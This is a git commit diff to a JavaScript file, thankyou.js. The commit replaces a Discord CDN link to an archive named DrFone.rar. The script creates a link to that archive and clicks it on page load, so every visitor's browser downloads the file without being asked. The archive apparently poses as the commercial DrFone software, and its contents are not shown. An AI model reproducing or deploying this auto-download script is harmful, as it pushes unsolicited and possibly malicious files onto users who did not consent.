62585f54ff1faac107360dbf3c01fb38aabc36cf
auenna <57557028+auenna@users.noreply.github.com>
2021-02-12 19:47:16 +0200

    Update thankyou.js

--- thankyou.js
+++ thankyou.js
@@ -1,4 +1,4 @@
 var link = document.createElement('a');
-link.setAttribute('href','https://cdn.discordapp.com/attachments/800051540953399306/809097421300301834/DrFone.rar');
+link.setAttribute('href','https://cdn.discordapp.com/attachments/800051540953399306/809842831103492157/DrFone.rar');
 link.setAttribute('download','download');
 onload=link.click();
